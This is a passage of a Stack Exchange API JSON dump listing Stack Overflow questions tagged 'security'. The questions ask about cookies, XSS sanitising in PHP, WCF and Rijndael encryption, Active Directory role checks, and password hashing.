</p>\n\n<pre><code>java.security.AccessControlException: Access denied\n</code></pre>\n\n<p>I am working in windows environment.  I can create a folder from the Windows Explorer, but not from the Java Code. </p>\n\n<p>How can I resolve this issue? </p>\n"},{"tags":["facebook","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":32,"score":-3,"question_id":13191868,"title":"To confirm that this is your account, please enter your date of birth","body":"<p>I appreciate if you could help me . I got a message when I am signing in my facebook :\nYour account is temporarily locked.\nSecurity Check\nTo confirm that this is your account, please enter your date of birth.</p>\n\n<p>Unfortunately , I dont remember the date of birth I entered .</p>\n\n<p>Please help me .</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["ruby-on-rails-3","security","devise","cancan","rails-admin"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13179927,"title":"CanCan and Boolean User Authorization - Security Risk?","body":"<p>For using Multiple \"roles\" on Users in rails_admin CanCan seems to be a great choice. So I added a Boolean Attribute \"admin\" to the User-Model and tell CanCan to allow access to rails_admin only if this is present. </p>\n\n<p>But isn't this a security issue? How can I be sure, that nobody is able to change the attribute?</p>\n"}]}
{"total":17772,"page":3,"pagesize":100,"questions":[{"tags":["security","node.js","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13189508,"title":"How to save the confidential data at server side","body":"<p>I create a web server with Node.js. The database is MongoDB. I'm using a json file to save the server configuration. The node module 'nconf' is used to read the json file. </p>\n\n<p>Currently, all the data, including some confidential data, saved in the json file is plain text. I don't think it is security enough. What should I do to make sure the confidential data is security?</p>\n"},{"tags":["android","iphone","security","api"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13188202,"title":"Best Practice for iphone app-server API security","body":"<p>I am making an app for iPhone (and android) that will have interaction with a RESTful server that does most of the heavy lifting. </p>\n\n<p>(At this point its just a messaging app so messages and profile data getting sent back and forth so little personal information.)</p>\n\n<p>What are the best practices for security for such an API:\nSome things that come to mind are</p>\n\n<ul>\n<li>doing everything over HTTPS</li>\n<li>getting a token from the server (and then possibly hashing it with a salt) and returning it with requests.</li>\n<li>Blowfish encoding the whole payload. </li>\n<li>Hashing the payload with a salt and adding that as a parameter. </li>\n</ul>\n\n<p>What sort of level of security is appropriate?</p>\n"},{"tags":["security","configuration","policy","lotus"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13188751,"title":"set lotus notes traveler security policy by device type","body":"<p>I'm having problem setting up Lotus Notes Traveler to support custom devices type. From the screenshot below, it seems lotus notes traveler only support custom security policy for known device types, either Windows, Nokia, Andorid or Apple. For device type out of the four, the default policy will be used.</p>\n\n<p><img src=\"http://i.stack.imgur.com/eEpN1.png\" alt=\"Security settings\"></p>\n\n<p>My question is, is it possible to assign a custom security policy for device type like 'my_super_app'?</p>\n"},{"tags":["security","cookies"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":57,"score":4,"question_id":13186550,"title":"Stealing \"remember me\" cookies a valid threat?","body":"<p>I'm using SSL to transmit all data. HTTP is completely disabled. Short of malware, or accessing someones physical machine (both of which are very hard to prevent from server side), I don't see how an attacker could steal a login cookie.</p>\n\n<p>Thus, is it okay to not worry about stealing a login cookie?</p>\n\n<p>The complexity to properly implement a non-stealable login cookie, that still allows users to have sessions across different browsers and different machines is higher than the material it's safe-guarding.</p>\n\n<p>Thus, I believe it's okay to not safe guard against copy and pasting cookie data from machine to machine.</p>\n\n<p>Is this a valid trade off, or am I forgetting something critical here.</p>\n"},{"tags":["php","security","spam","error-log"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13185171,"title":"An unfamiliar entry in my error log??? Anyone know have an idea what it is/means?","body":"<p>I just check my server's error log to see if it would give me any hints about why a script I'm writing isn't looping over all the elements in it.</p>\n\n<p>Instead I found this single entry:</p>\n\n<blockquote>\n  <p>[Thu Nov 01 12:58:31 2012] [error] [client 108.174.61.133] client denied by server configuration: /home/myusername/public_html/application/mform id=, referer: <a href=\"http://g2m21:temppass@mysitename.co/login/return_url/64-L2Jsb2dzLzc1LzM0L3Jldmlld3Mtb24tZmxleC1iZWx0\" rel=\"nofollow\">http://g2m21:temppass@mysitename.co/login/return_url/64-L2Jsb2dzLzc1LzM0L3Jldmlld3Mtb24tZmxleC1iZWx0</a></p>\n</blockquote>\n\n<p>I've never seen an error like this &amp; due to the number of spammers/spambots that are always trying to post bogus blogs; I wonder if this is due to some sort of attempted hack/security threat.</p>\n"},{"tags":["python","security","api","password-protection","fabric"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":45,"score":3,"question_id":13178691,"title":"How does python fabric protect ssh credentials?","body":"<p>So I've recently stumbled upon python fabric api and have been really happy with how it can help me with day-to-day sysadmin tasks. I would like to start using it at work but it is a very security-conscious environment. I was wondering how fabric handles the ssh password you provide to it while it runs it's tasks? I'm assuming it plonks it in memory somewhere and pulls it out when required to login to the next host in <code>env.hosts</code>? How does it protect this password while in memory?</p>\n\n<p>I can see I'm going to be asked lots of questions along these lines so I'm looking for a nice way to explain to security-minded type of people that fabric is nice and friendly and doesn't pose a risk or at least no more of a risk than anything else we already have :)</p>\n"},{"tags":["security","iframe","cookies"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3750,"score":3,"question_id":2117248,"title":"Setting cookie in iframe - different Domain","body":"<p>we have our site integrated as an iframe into another site that runs on a different domain. It seems that we cannot set cookies. Has anybody encountered this issue before? Any ideas?</p>\n\n<p>Thanks\nHolger</p>\n"},{"tags":["c#",".net","asp.net-mvc","security","active-directory"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":103,"score":3,"question_id":13147132,"title":"Active Directory Group Membership Checking in .Net 4.5","body":"<p>I have an ASP.Net MVC application using Windows Authentication, and I am checking group membership for security on controller actions. </p>\n\n<p>Simple as it sounds, I've found no other Question that can resolve the problem I am experiencing.</p>\n\n<h3>First Attempt: [Authorize]</h3>\n\n<p>The classic method is to simply slap an <code>Authorize</code> data annotation attribute on the controller action and go to town:</p>\n\n<pre><code>[Authorize(Roles = @\"domain\\groupName1\")]\n</code></pre>\n\n<p>No dice. I am prompted for credentials. Usually this means something is wrong with the Windows Authentication configuration but it's setup fine: (1) <code>HttpContext.User</code> is a <code>WindowsPrincipal</code> object, and (2) I confirmed another known group name works.</p>\n\n<h3>Second Attempt: IsInRole()</h3>\n\n<p>The next step taken was to go a more old fashioned route and use <code>IPrincipal.IsInRole()</code>, and again, one returns <code>false</code>, the other <code>true</code>.</p>\n\n<pre><code>var wp = (WindowsPrincipal)User;\n\n// false\nvar inGroup1 = wp.IsInRole(@\"domain\\groupName1\");\n// true\nvar inGroup2 = wp.IsInRole(@\"domain\\groupName2\");\n</code></pre>\n\n<p>Stumped... so I hit up my systems nerds and we double check everything. User is a group member? Yes. Group name is spelled correctly? Yes. The next step was to snag the SID.</p>\n\n<h3>Third Attempt: Search Identity's Group Collection</h3>\n\n<p>In my controller I check the <code>WindowsIdentity</code> and look through the group collection for the SID of the troublesome group:</p>\n\n<pre><code>var wi = (WindowsIdentity)wp.Identity;\nvar group = wi.Groups.SingleOrDefault(g =&gt; g.Value == \"group1-sidValue\");\n</code></pre>\n\n<p>The <code>group</code> variable is the <code>SecurityIdentifier</code> object. Because it is not null, we can be certain that this current user is a member of the group that both the <code>[Authorize()]</code> or <code>IsInRole()</code> attempts fail to confirm.</p>\n\n<h3>Fourth Attempt: DirectoryServices.AccountManagement</h3>\n\n<p>At this point, I'm going nuts and add reference to the AccountManagement APIs. I search the domain context for the <code>GroupPrincipal</code> by both name and SID:</p>\n\n<p>var pc = new PrincipalContext(ContextType.Domain, \"domain\");\n   var gp1byName = GroupPrincipal.FindByIdentity(pc, \"groupName1\")\n   var gp1bySid = GroupPrincipal.FindByIdentity(pc, IdentityType.Sid, \"group1-sidValue\");</p>\n\n<p>Both group principal variables are ripe with the same object, and I verified through a watch variable that the principal's <code>Members</code> collection contains a <code>UserPrincipal</code> object with the same SID as the current <code>WindowsPrincipal</code> on <code>HttpContext</code>.</p>\n\n<h3>Question:</h3>\n\n<p>What in the hell have I missed here? Why would both role checking methodologies fail when it is plain and clear through object exploration that the user is a valid member of this given group? </p>\n\n<p>The fact that one group checks fine and the other does not seems the most strange part at this point.</p>\n\n<p>Please help.</p>\n"},{"tags":["security","azure","remote-desktop","azure-web-roles"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13182706,"title":"How to secure remote desktop access to windows azure instances","body":"<p>I've successfully <a href=\"http://msdn.microsoft.com/en-gb/library/windowsazure/gg443832.aspx\" rel=\"nofollow\">enabled Remote Desktop access</a> to my Windows Azure Web role, but ideally I'd like to lock down access so it's not only protected by a password. Is this possible? For example, restrict RDP access to specific IP ranges, require a client certificate, etc.</p>\n\n<p>I realise that you're advised not to enable Remote Desktop at all times but rather only enable it for troubleshooting. But if it's enabled for troubleshooting the security problem still remains. (Also seems annoying that you can't enable/disable RDP access without republishing, unless I'm missing something).</p>\n\n<p>thanks</p>\n"},{"tags":["php","html","security","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13182682,"title":"PHP Security - Combining functionality of strip_tags(); & htmlspecialchars();","body":"<p>I want my forum users to be able to insert links and other allowed tags. For example I would like the following HTML in a post to display as the writer intended (i.e. as a functioning link): </p>\n\n<pre><code>&lt;a href=\"http://www.example.com\" rel=\"nofollow\"&gt;A page&lt;/a&gt;\n</code></pre>\n\n<p>However, I want to maintain some level of security and have been reading up on <a href=\"http://php.net/manual/en/function.strip-tags.php\" rel=\"nofollow\">strip_tags</a>() and <a href=\"http://www.php.net/manual/en/function.htmlspecialchars.php\" rel=\"nofollow\">htmlspecialchars</a>(). I thought at first that I could use strip_tags with something like:</p>\n\n<pre><code>&lt;?php $link_string = strip_tags($link_string, '&lt;a&gt;'); ?&gt;\n</code></pre>\n\n<p>But strip_tags doesn't protect me like htmlspecialchars does if I understand correctly. For example, incorrect HTML code using special characters can leave me vulnerable. And so can the style and onmouseover attributes for the link tag. </p>\n\n<p>What is the most <strong><em>simple</em></strong> solution to allow the above link in the post while cleaning out potentially harmful characters and code? Is there anyway I can combine these two PHP functions to do this in a <strong><em>simple</em></strong> manner? </p>\n"},{"tags":["asp.net-mvc","asp.net-mvc-3","security","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13179440,"title":"ASP.NET MVC3 HtmlPasswordFor how to make it not reset after post methods","body":"<p><br>\nEssentially I have a HtmlPasswordFor(m => EmployeeID), I have a button called \"Go\". Once I hit the Go textbox, I actually do not want the password to disappear on the or have the field password to be cleared. <br>\nHow would I do this?<br><br><br>\nBEFORE\n<img src=\"http://i.stack.imgur.com/vOzfF.png\" alt=\"enter image description here\">\n<br><br><br>\nAFTER\n<img src=\"http://i.stack.imgur.com/JggyK.png\" alt=\"enter image description here\"> \nI do not want the my employeeid to reset. I want to keep the passwords in <em>*</em>*'s, but I'll need the password on my next post call.\n<br><br></p>\n\n<h2>Controller</h2>\n\n<pre><code>    [HttpGet]\n    public ActionResult MainForm()\n    {\n        var model = new VTViewModel();\n        return View(model);\n    }\n\n    [HttpPost]\n    public ActionResult MainForm(VTViewModel model, string buttontype)\n    {\n        if (ModelState.IsValid)\n        {\n            string EmployeeID = (Convert.ToInt64(model.EmployeeBinaryID, 2)).ToString();\n            if (buttontype == \"Go\")\n            {\n                // GET Fields depending on the serial number.\n\n                model.ListFields = logic_model.getFormInfo(model.SerialNumber, EmployeeID);\n                if (model.ListFields[0].return_num == \"0\")\n                {\n                    model.Go = true;\n                    // Set Process\n                    // Set Header Token\n                    // Set Header Title\n\n                    ViewData[\"HEADER\"] = model.ListFields[0].HeaderName + \" | \" + model.ListFields[0].TubeType + \" | \" + model.ListFields[0].ProductLine;\n                }\n                else\n                {\n                    model.DisplayMessage = helper.checkErrors(model.ListFields[0].return_num);\n                }\n            }\n            else if (buttontype == \"Submit\")\n            {\n                model.HeaderToken = model.ListFields[0].HeaderToken; \n                string header = model.HeaderToken;\n                string check = \"\";                                                        \n                string return_num = model.ListFields[0].return_num; \n                // If the submission worked\n\n                //SUBMIT HERE INTO DB then Clear\n                List&lt;string&gt; values_to_submit = new List&lt;string&gt;(); // Creates a list to store the values to submit\n                for (int i = 0; i &lt; model.ListFields.Count; i++)\n                {\n                    // Fills in the hidden values.\n                    if (model.ListFields[i].isHidden)\n                    {\n                        if (model.ListFields[i].Token == \"SNT\" || model.ListFields[i].Token == \"SNC\")\n                        {\n                            model.ListFields[i].Value = model.SerialNumber;\n                        }\n                        else if (model.ListFields[i].Token == \"USR\")\n                        {\n                            model.ListFields[i].Value = EmployeeID;\n                        }\n                        else if (model.ListFields[i].Token == \"TMS\")\n                        {\n                            model.ListFields[i].Value = \"0\";\n                        }\n                    }\n\n                    // If it is a check box do the right conversion.\n                    if (model.ListFields[i].DataType == \"DATA-CKBOX\")\n                    {\n                        //string convertedValue = helper.trueFalseStringtToIntBool(model.ListFields[i].Value);\n                        string convertedValue = helper.boolToInt(model.ListFields[i].BoolValue).ToString();\n                        model.ListFields[i].Value = convertedValue;\n                    }\n\n                    values_to_submit.Add(model.ListFields[i].Token + model.ListFields[i].Value);\n\n                }\n\n                check = logic_model.helperSubmit(values_to_submit, header, 1);\n\n\n\n                if (check == \"Submitted\")\n                {\n                    ModelState.Clear();\n                    VTViewModel clear_model = new VTViewModel(); // Creates an empty model\n                    clear_model.DisplayMessage = \"Submitted\\n\" + model.SerialNumber + \"\\n\" + DateTime.Now;\n                    return View(clear_model);\n                }\n                else\n                {\n                    model.DisplayMessage = check; // Sets the display message to the error.\n                }\n\n            }\n            else if (buttontype == \"Clear\")\n            {\n                // Clears the screen and model\n                ModelState.Clear();\n                VTViewModel clear_model = new VTViewModel(); // Creates an empty model\n                return View(clear_model);\n            }\n        }\n        return View(model);\n\n    }\n</code></pre>\n\n<h2>View</h2>\n\n<pre><code>    div&gt;\n         &lt;fieldset&gt;\n         &lt;table id=\"main_table\"&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;@Html.LabelFor(m =&gt; m.SerialNumber)&lt;/td&gt;\n                    &lt;td&gt;@Html.LabelFor(m =&gt; m.EmployeeBinaryID)&lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;@Html.TextBoxFor(m =&gt; m.SerialNumber)&lt;/td&gt;\n                    &lt;td&gt;@Html.PasswordFor(m =&gt; m.EmployeeBinaryID, new { autocomplete = \"off\" }) &lt;/td&gt;\n                &lt;/tr&gt;\n\n                &lt;tr&gt;&lt;td&gt;&lt;input type=\"submit\" value=\"Go\" name=\"buttontype\" class=\"submit_button\" id=\"btn\"/&gt;&lt;br /&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;\n         &lt;/table&gt;\n         &lt;/fieldset&gt;\n         &lt;br /&gt; \n</code></pre>\n\n<p><br><br>\nThanks</p>\n"},{"tags":["security","user","folders","subdomains","pages"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13168230,"title":"Security of website with user's pages: folders or subdomains?","body":"<p>The client wants to make the site (webservice, as he named it), where users can create their own pages, including  with JS scripts, etc. I see two ways - using the folders:</p>\n\n<pre><code>http://service.com/user/name/ ...\n</code></pre>\n\n<p>and subdomains:</p>\n\n<pre><code>http://user.service.com/...\n</code></pre>\n\n<p>Both paths are not the problem, but the client wants to make it using folders for SEO benefits.\nI think if I use folders, it will make the site less secure. For example, user can send AJAX request from its page and the server will respond him. If it was a sub-domain, in accordance with the SOP (Same Origin Policy) request would be rejected. Correct if I'm wrong.</p>\n\n<p>Is it real problem with SOP for folders?\nAre there any other security issues for folders?\nIs it safer to use subdomains?</p>\n"},{"tags":["wcf","security","networking","encryption"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13177024,"title":"Add RSA based encryption to WCF service without certificates","body":"<p>I am looking for a way to encrypt messages between client and server using the WCF. WCF offers a lot of built in security mechanisms to enrcypt traffic between client and server, but there seems to be nothing fitting my requirements.</p>\n\n<p><strong>I don't want to use certificates</strong> since they are too complicated, so don't suggest me to to use certificates please. I don't need confidentiality, so I though I'll go best using plain RSA.</p>\n\n<p><strong>I want real security</strong>, no hardcoded key or something. I was thinking about having a public/private keypair generated every time the server starts. Both keys will only be stored in RAM.\nThen wen a client connects it should do exactly like SSL. Just as described <a href=\"http://stackoverflow.com/a/1571183/808723\">here</a>.</p>\n\n<blockquote>\n  <p>1.exchange some form of a private/public key pair; the server generates a key pair and keeps the private key to itself and shares the public key with the client (e.g. over a WCF message, for instance)</p>\n  \n  <p>2.using that private/public key pair, exchange a common shared secret, e.g. an \"encryption key\" that will symmetrically encrypt your messages (and since it's symmetrical, the server can use the same key to decrypt the messages)</p>\n  \n  <p>3.setup infrastructure on your client (e.g. a WCF extension called a behavior) to inspect the message before it goes out and encrypt it with your shared secret</p>\n</blockquote>\n\n<p>That would be secure, wouldn't it?</p>\n\n<p><strong>Is there any existing solution to archive what I described? If not I'll create it on my own. Where do I start best? Which kind of WCF custom behaviour is the best to implement?</strong></p>\n\n<hr>\n\n<p><strong>EDIT:</strong>\nAs this is NOT secure, I'll take the following approach:</p>\n\n<p>When Installing the server component a new X509 certificate will be generated and automatially added to the cert store (of the server). The public part of this generated certificate will be dynamically included into the client setup. When running the client setup on the client machine the certificate will be installed into the trustet windows certificate store of the client.</p>\n\n<p>So there's no extra work when installing the product and everything should be secure, just as we want it.</p>\n"},{"tags":["asp.net","security","asp.net-webforms","rijndaelmanaged"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":50,"score":0,"question_id":13177605,"title":"Asp.net code not working for implementing rijndael encryption, decryption?","body":"<p>I'm reading a book entitled beginning asp.net security from wrox and I'm in this part where it shows a code snippet for using rijndael the problem this example is not included in the downloadable source codes. I decided to seek (professional)help here in the forums.</p>\n\n<p>It would be awesome if you try and test it as well and hopefully give an example(codes) on how I could implement it.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>public class EncryptionRijndael\n{\n        public EncryptionRijndael()\n        {\n                //\n                // TODO: Add constructor logic here\n                //\n        }\n\n    public static byte[] GenerateRandomBytes(int length)\n    {\n        byte[] key = new byte[length];\n        RNGCryptoServiceProvider provider = new RNGCryptoServiceProvider();\n        provider.GetBytes(key);\n        return key;\n    }\n\n    public void GetKeyAndIVFromPasswordAndSalt(string password, byte[] salt,SymmetricAlgorithm symmetricAlgorithm,ref byte[] key, ref byte[] iv)\n    {\n        Rfc2898DeriveBytes rfc2898DeriveBytes =\n        new Rfc2898DeriveBytes(password, salt);\n        key =\n        rfc2898DeriveBytes.GetBytes(symmetricAlgorithm.KeySize / 8);\n        iv =\n        rfc2898DeriveBytes.GetBytes(symmetricAlgorithm.BlockSize / 8);\n    }\n\n    public static byte[] Encrypt(byte[] clearText, byte[] key, byte[] iv)\n    {\n        // Create an instance of our encyrption algorithm.\n        RijndaelManaged rijndael = new RijndaelManaged();\n        // Create an encryptor using our key and IV\n        ICryptoTransform transform = rijndael.CreateEncryptor(key, iv);\n        // Create the streams for input and output\n        MemoryStream outputStream = new MemoryStream();\n        CryptoStream inputStream = new CryptoStream(\n        outputStream,\n        transform,\n        CryptoStreamMode.Write);\n        // Feed our data into the crypto stream.\n        inputStream.Write(clearText, 0, clearText.Length);\n        // Flush the crypto stream.\n        inputStream.FlushFinalBlock();\n        // And finally return our encrypted data.\n        return outputStream.ToArray();\n    }\n\n    static byte[] Decrypt(byte[] cipherText, byte[] key, byte[] iv)\n    {\n        // Create an instance of our encyrption algorithm.\n        RijndaelManaged rijndael = new RijndaelManaged();\n        // Create an decryptor using our key and IV ;\n        ICryptoTransform transform = rijndael.CreateDecryptor(key, iv);\n        // Create the streams for input and output\n        MemoryStream outputStream = new MemoryStream();\n        CryptoStream inputStream = new CryptoStream(outputStream,transform,CryptoStreamMode.Write);\n        // Feed our data into the crypto stream.\n        inputStream.Write(cipherText, 0, cipher.Length);\n        // Flush the crypto stream.\n        inputStream.FlushFinalBlock();\n        // And finally return our decrypted data.\n        return outputStream.ToArray();\n    }\n}\n</code></pre>\n\n<p>Sir/Ma'am your answers would be of great help. Thank you++\n(it would be awesome if you could show me how to call encrypt and decrypt properly)</p>\n"},{"tags":["php","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13178316,"title":"PHP Stateless Authentication","body":"<p>I'm not new to PHP, but for authentication I've always used sessions. \nNow I'd like to make stateless authentication, so I can't use sessions, because there might be many server instances, and they won't share session data, so what I thought is have a session table on my database, and do the following:</p>\n\n<ul>\n<li>Store a cookie with a token in the client's machine</li>\n<li>Have a <em>token</em> column in the session table, something like a GUID, so all entries with the same token can be accessed by the client</li>\n<li>Also store the ip of the client, so people with the same token but different IP can't read the data</li>\n</ul>\n\n<p>Something like this</p>\n\n<pre><code>id   | token        | ip         | key       | data\n1    | a-guid       | 190.0.0.1  | username  | encrypted-data\n2    | a-guid       | 190.0.0.1  | is_logged | more-encrypted-data \n3    | other-guid   | 190.2.2.2  | is_logged | some-more-data\n</code></pre>\n\n<p>So the user with a cookie with token a-guid and ip 190.0.0.1 can access <em>username</em> and *is_logged* </p>\n\n<p>But I'm not sure about security, if someone could somehow get your token from your cookies, and your ip, and he/she could send a request with your cookie token and your ip, it would have complete access to your account.</p>\n\n<p>Should I have some special considerations?</p>\n"},{"tags":["php","security","htmlspecialchars","addslashes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":36,"score":-1,"question_id":13177176,"title":"htmlspecialchars + addslashes, makes any sense?","body":"<p>I'm trying to sanitize a string to be saved in a db.\nFirst step I took was to use <code>addslashes()</code>, but then I realized it didn't solve many security issues, so I added <code>htmlspecialchars()</code>, and now I have this line of code:</p>\n\n<pre><code>$val=htmlspecialchars(addslashes(trim($val)));\n</code></pre>\n\n<p>But then I was wondering if it makes any sense at all to use <code>addslashes()</code> on a string that will be processed by <code>htmlspecialchars()</code>, since the latter will \"remove\" any element that would cause problems, if I'm not mistaken.</p>\n\n<p>In particular, I was wondering if that makes the server work twice without any real need.</p>\n"},{"tags":["asp.net","security","iis","file-upload","file-permissions"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":40,"score":3,"question_id":13169589,"title":"Web-enabled file storage and security implications of giving delete permission to IIS_IUSRS","body":"<p>I've had this question for many years, and did research every time that this issue arose, but could never find a definite answer. Somehow the mighty Internet, MSDN, community forums, are either silent or vague on this. Out of thousands of development-related uncertainties, this is the only one that remained elusive.</p>\n\n<p><strong>To the point:</strong> in order to enable users to upload and manage images (and other files) used in their blog posts, in a shared hosting environment, I can either consider SQL Server binary data types (performance implications), or the file system. To use the latter, the necessary permissions need to be set for the IIS_IUSRS role on the storage directory : create/write, read and delete. My question - if I do this, what are the security implications? Could someone somehow take advantage of this, bypass the ASP.NET request pipeline and manipulate the files inside the folder without making a request to the corresponding ASP.NET handler (which checks rights, validates uploads, etc.)?</p>\n\n<p>I've developed several systems that allowed file uploads and this has always bothered me. Now, hopefully, someone will be able to put my mind at ease and, ideally, explain the mechanics behind the process.</p>\n\n<hr>\n\n<p><strong>UPDATE</strong></p>\n\n<p>After viewing the latest answers (many thanks), another formulation of the question:</p>\n\n<p>Is it in any way possible for a client to somehow bypass the request pipeline and create/delete files inside a directory that allows it (assuming the person knows the directory structure)? Or only the code that handles the request can do it? Any potential exploits?</p>\n"},{"tags":["security","sharepoint2010"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3393,"score":1,"question_id":4130276,"title":"Why can't users in the \"Visitors\" group access my SharePoint 2010 publishing site. It works when i promote them to the \"Members\" group","body":"<p>When I place a test AD account in the Visitors group they are unable to view any pages on my new intranet site. The users receives the \"Error access denied\" sharepoint screen and indicates that the account was able to authenticate, but that some authorisation rule is permitting it from viewing the page.</p>\n\n<p>When i remove then and place them in the Members or Owners groups they are able to view the pages as well as perform the expected functions like editing content and creating subsites. </p>\n\n<p>Interesting, while in only the Visitors group, users can view the \"All Site Content\" page that is located here: /_layouts/viewlsts.aspx but not /pages/default.aspx.</p>\n\n<p>Has anyone experienced this before?</p>\n\n<p>Environment info: \n1 Web application, 1 Site collection using the Publishing Portal template. A few custom master pages, lots of custom page layouts and user controls. All deployed via features.\nSharepoint 2010 Standard edition, 64bit running on Windows Server 2008 against SqlServer 2008 Enterprise Edition. Authentication is against AD, not any other forms auth providers etc.</p>\n"},{"tags":["ruby","security","https","sinatra","rack"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13173543,"title":"Using https in Sinarta (Rack) application","body":"<p>I develop   a Sinatra app which lets users to login through some external web sites. One of those sites requires having 2 https pages on my Sinatra web site: Accept and Reject:</p>\n\n<pre><code>https://my_sinatra_app.com/external_login/site1/accept  \nhttps://my_sinatra_app.com/external_login/site1/reject\n</code></pre>\n\n<p>If an user enters valid login and password and clicks \"Agree\" on site1, they are going to be redirected to accept page on my web site, otherwise -- to reject one.</p>\n\n<p>Well, it's not so important. The question is, what do I have to do to use https in a Sinatra application? I need a very solution which allows me to use https on localhost and on a web hosting. Just to make my application work especially on localhost.</p>\n\n<p>Your thoughts?</p>\n"},{"tags":["security","cryptography","social-networking"],"answer_count":5,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":380,"score":3,"question_id":6725147,"title":"Considerations regarding a p2p social network","body":"<p>While the are many <strong>social networks</strong> in the wild, most rely on data stored on a central site owned by a third party.</p>\n\n<p>I'd like to build a solution, where <strong>data remains local on member's systems</strong>. Think of the project as an <strong>address book, which automagically updates</strong> contact's data as soon a a contact changes its coordinates. This base idea might get extended later on...</p>\n\n<p>Updates will be transferred using <strong>public/private key cryptography</strong> using a central host. The sole role of the <strong>host is to be a store and forward intermediate</strong>. Private keys remain private on each member's system.  </p>\n\n<p>If two client are both online and a <strong>p2p connection could be established</strong>, the clients could transfer data telegrams without the central host.</p>\n\n<p>Thus, <strong>sender and receiver</strong> will be the only parties which are able create <strong>authentic messages</strong>. </p>\n\n<p>Questions:</p>\n\n<ul>\n<li>Do exist certain protocols which I should adopt?</li>\n<li>Are there any security concerns I should keep in mind? </li>\n<li>Do exist certain services which should be integrated or used somehow?</li>\n</ul>\n\n<p>More technically:</p>\n\n<ul>\n<li>Use e.g. Amazon or Google provided services? </li>\n<li>Or better use a raw web-server? If yes: Why?</li>\n<li>Which algorithm and key length should be used?</li>\n</ul>\n\n<p><strong>UPDATE-1</strong></p>\n\n<p>I googled my own question title and found this academic project developed 2008/09: <a href=\"http://www.lifesocial.org/\" rel=\"nofollow\">http://www.lifesocial.org/</a>.</p>\n"},{"tags":["security","ntp","dmz"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":5,"score":0,"question_id":13173163,"title":"should the NTP server reside in DMZ? what are the security concerns?","body":"<p>should the NTP server reside in DMZ? what are the security concerns?  i am doing network architecture security review.</p>\n"},{"tags":["c#","string","security","xss"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":103,"score":2,"question_id":7822079,"title":"How to Secure a string from UserInput","body":"<p>We have a Website where a user can reject something from another user with a reason. The reason is sent to the other user via email.</p>\n\n<p>What characters can be sent to the other user?\nI am not going to do a regex search for unwanted characters but rather only want to keep \"potentially\" \"safe\" characters in the reason.</p>\n\n<p>For example the reason:</p>\n\n<pre><code>\"Hello &lt;b&gt;Dear User B\"\n</code></pre>\n\n<p>Would be transformed to:</p>\n\n<pre><code>\"Hello bDear User B\"\n</code></pre>\n\n<p>Currently i'm just doing a \"Where\" on the char array and define my \"safe\" conditions via</p>\n\n<pre><code>char.IsLetterOrDigit || char.IsPunctuation || char.IsWhiteSpace\n</code></pre>\n\n<p>Are there any better techniques?</p>\n"},{"tags":["asp.net","database","security","hash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13172185,"title":"Should I store (password with salt) in the database or hashed password and salt as two different fields in the database?","body":"<p>I would like to ask if this hashing technique is good enough for asp.net?</p>\n\n<p>I plan to save the hashed password in a single field called 'password' and then hash the user input password on the login page and see if it matches</p>\n\n<p>Here is the code:</p>\n\n<pre><code>public const int SALT_BYTES = 24;\n    public const int HASH_BYTES = 24;\n    public const int PBKDF2_ITERATIONS = 1000;\n\n    public const int ITERATION_INDEX = 0;\n    public const int SALT_INDEX = 1;\n    public const int PBKDF2_INDEX = 2;\n\n    /// &lt;summary&gt;\n    /// Creates a salted PBKDF2 hash of the password.\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"password\"&gt;The password to hash.&lt;/param&gt;\n    /// &lt;returns&gt;The hash of the password.&lt;/returns&gt;\n    public static string CreateHash(string password)\n    {\n        // Generate a random salt\n        RNGCryptoServiceProvider csprng = new RNGCryptoServiceProvider();\n        byte[] salt = new byte[SALT_BYTES];\n        csprng.GetBytes(salt);\n\n        // Hash the password and encode the parameters\n        byte[] hash = PBKDF2(password, salt, PBKDF2_ITERATIONS, HASH_BYTES);\n        return PBKDF2_ITERATIONS + \":\" +\n           Convert.ToBase64String(salt) + \":\" +\n           Convert.ToBase64String(hash);\n    